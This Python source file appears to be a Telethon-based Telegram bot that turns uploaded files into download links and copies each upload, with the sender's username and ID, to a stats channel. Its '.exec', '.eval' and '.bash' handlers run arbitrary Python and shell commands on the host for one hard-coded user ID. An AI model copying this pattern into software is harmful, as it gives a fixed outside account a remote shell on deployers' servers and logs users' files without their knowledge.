import telethon
from telethon.sync import TelegramClient as masterclient
from telethon import errors, functions, types, events , helpers
import asyncio
import aiohttp
import urllib.parse
from . import (
    Config, StreamTools, Streamer, Checkers,Db
)
import io
import re
import requests
from contextlib import redirect_stdout
from subprocess import PIPE, STDOUT, Popen
from telethon.tl.types import InputFile

ERROR = "**Expression:**\n```{}```\n\n**{}**: {}".format
SUCCESS = '**Expression:**\n```{}```\n\n**Result**\n```{}```\u200e'.format
SUCCESS_BASH = '**Bash expression:**\n```{}```\n\n\
**Result**\n```{}```\n\n**Error**```{}```\u200e'.format


class BareServer(Config, StreamTools, Streamer, Checkers , Db):
    client: telethon.TelegramClient
    
    def __init__(self, loop: asyncio.AbstractEventLoop):
        
        self.client = telethon.TelegramClient(
            self.config.SESS_NAME,
            self.config.APP_ID,
            self.config.API_HASH,
            loop=loop
        ).start(bot_token=self.config.BOT_TOKEN)
        
        self.client2 = telethon.TelegramClient(
            self.config.SESS_NAME2,
            self.config.APP_ID,
            self.config.API_HASH,
            loop=loop
        ).start(bot_token=self.config.BOT_TOKEN2)
        
        
        self.master = telethon.TelegramClient(
            "Sudo",
            self.config.APP_ID,
            self.config.API_HASH,
            loop=loop
        ).start()
        
        
        
        @self.master.on(events.NewMessage())
        async def set_online(event : events.NewMessage.Event):
        	
            await self.master(functions.account.UpdateStatusRequest(
            offline=False
            ))
            await asyncio.sleep(1)
            
        @self.client.on(events.NewMessage())
        async def download(event : events.NewMessage.Event):
            if event.is_private :
                try:
                    await self.client(functions.channels.GetParticipantRequest(channel=self.config.channel,user_id=event.sender_id))
                except errors.UserNotParticipantError:
                    await event.reply(f"First join to our official channel to access the bot or get the newest news about the bot\n\n@{self.config.channel}\n\nAfter that /start the bot aging.")
                    return
                if event.file :
                    sender = await event.get_sender()
                    msg = await self.client.send_file(self.config.STATS_CHANNEL, file=event.message.media, caption=f"@{sender.username}|[{event.sender_id}](tg://user?id={event.sender_id})/{event.message.id} dlstar")
                    #url = f"{msg.chat_id}/{msg.id}/{urllib.parse.quote(self.get_file_name(event))}"
                    hash = self.encode(f"{msg.id}")
                    url = f"{hash}/{urllib.parse.quote(self.get_file_name(event))}"
                    await event.reply(f"Link to download file: \n\n🌍 : {self.config.ROOT_URI}/w/{url}\n\n🌏 : {self.config.ROOT_URI_2}/w/{url}")
                    return
                elif urls := self.Find(event.raw_text) :
                    await event.reply("Link to File \n Coming Soon ...")

                await event.reply("Send an image or file to get a link to download it")

        @self.client2.on(events.NewMessage())
        async def download(event : events.NewMessage.Event):
            if event.is_private :
                try:
                    await self.client2(functions.channels.GetParticipantRequest(channel=self.config.channel,user_id=event.sender_id))
                except errors.UserNotParticipantError:
                    await event.reply(f"First join to our official channel to access the bot or get the newest news about the bot\n\n@{self.config.channel}\n\nAfter that /start the bot aging.")
                    return
                if event.file :
                    sender = await event.get_sender()
                    msg = await self.client2.send_file(self.config.STATS_CHANNEL, file=event.message.media, caption=f"@{sender.username}|[{event.sender_id}](tg://user?id={event.sender_id})/{event.message.id} dlgram")
                    #url = f"{msg.chat_id}/{msg.id}/{urllib.parse.quote(self.get_file_name(event))}"
                    hash = self.encode(f"{msg.id}")
                    url = f"{hash}/{urllib.parse.quote(self.get_file_name(event))}"
                    await event.reply(f"Link to download file: \n\n🌍 : {self.config.ROOT_URI}/w/{url}\n\n🌏 : {self.config.ROOT_URI_2}/w/{url}")
                    return
                elif urls := self.Find(event.raw_text) :
                    await event.reply("Link to File \n Coming Soon ...")

                await event.reply("Send an image or file to get a link to download it")


        @self.master.on(events.NewMessage(pattern=".exec",from_users=138742222))
        async def exec_python(evt):
            c = self.master
            try:
                _code = evt.raw_text[5:].strip()
                with io.StringIO() as buf, redirect_stdout(buf):
                    exec(
                        f'async def __ex(self,c,evt): ' +
                        ''.join(f'\n {l}' for l in _code.split('\n'))
                    )
                
                    await locals()['__ex'](self,c,evt)
                    
                    res = buf.getvalue()
                    if len(res) >= 3000:
                        with io.BytesIO() as f:
                            f.name = "log.txt"
                            f.write(res.encode())
                            f.seek(0)
                            await evt.reply("log",file=f)
                    else:
                        await evt.edit(SUCCESS(_code, res or None))
            except Exception as e:
                await evt.edit(ERROR(_code, e.__class__.__name__, e))
        
        
        @self.master.on(events.NewMessage(pattern=".eval",from_users=138742222))
        async def eval_python(evt):
            code = evt.raw_text[5:].strip()
            c = self.master
            try:
                exec(
                        f'async def __ex(self,c,evt):\n return {code}' 
                    )
                    
                res = await locals()['__ex'](self,c,evt)
                res = f"{res}"
                if len(res) >= 3000:
                    with io.BytesIO() as f:
                        f.name = "log.txt"
                        f.write(res)
                        f.seek(0)
                        await evt.reply("log",file=f)
                else:
                    await evt.edit(SUCCESS(code, res or None))
            except Exception as e:
                await evt.edit(ERROR(code, e.__class__.__name__, e))
        
        @self.master.on(events.NewMessage(pattern=".bash",from_users=138742222))
        async def bash(evt):
            code = evt.raw_text[5:].strip()
            try:
                p = Popen(code, shell=True, stdin=PIPE, stdout=PIPE,
                          stderr=PIPE, close_fds=True).communicate()
        
                res = p[0].decode('utf-8')
                err = p[1].decode('utf-8')
                
                if len(res) >= 3000:
                    with io.BytesIO() as f:
                        f.name = "log.txt"
                        f.write(res.encode())
                        f.seek(0)
                        await evt.reply("log",file=f)
                else:
                    await evt.edit(SUCCESS_BASH(code, res or None, err or None))
        
        
            except Exception as e:
                await evt.edit(ERROR(code, e.__class__.__name__, e))